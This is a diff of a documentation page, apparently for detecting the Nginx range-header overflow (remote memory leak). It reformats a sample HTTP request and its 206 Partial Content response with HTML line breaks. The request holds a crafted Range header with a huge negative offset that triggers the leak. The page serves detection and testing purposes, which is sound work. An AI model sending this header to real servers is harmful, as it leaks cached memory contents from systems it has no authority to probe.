@@ -9,23 +9,23 @@ The response code for detecting Nginx Remote Overflow is 206 and Partial Content
 
 ### Request
 
- GET /domain HTTP/1.1
- Accept-Encoding: identity
- Range: bytes=-17208,-9223372036854758792
- Host: 127.0.0.1:8000
- Connection: close
- User-Agent: Python-urllib/2.7
+ GET /domain HTTP/1.1<br/>
+ Accept-Encoding: identity<br/>
+ Range: bytes=-17208,-9223372036854758792<b/r>
+ Host: 127.0.0.1:8000<br/>
+ Connection: close<br/>
+ User-Agent: Python-urllib/2.7<br/>
 
 ## Response
 
- HTTP/1.1 206 Partial Content
- Server: nginx/1.13.1
- Date: Mon, 21 May 2020 06:51:52 GMT
- Content-Type: multipart/byteranges; boundary=00000000000000000002
- Connection: close
- Last-Modified: Mon, 17 Jul 2017 02:19:08 GMT
- ETag: "40c9-5547a060fdf00"
- X-Proxy-Cache: HIT
- --00000000000000000002
- Content-Type: text/html
- Content-Range: bytes -623-16584/16585
+ HTTP/1.1 206 Partial Content<br/>
+ Server: nginx/1.13.1<br/>
+ Date: Mon, 21 May 2020 06:51:52 GMT<br/>
+ Content-Type: multipart/byteranges; boundary=00000000000000000002<br/>
+ Connection: close<br/>
+ Last-Modified: Mon, 17 Jul 2017 02:19:08 GMT<br/>
+ ETag: "40c9-5547a060fdf00"<br/>
+ X-Proxy-Cache: HIT<br/>
+ --00000000000000000002<br/>
+ Content-Type: text/html<br/>
+ Content-Range: bytes -623-16584/16585<br/>
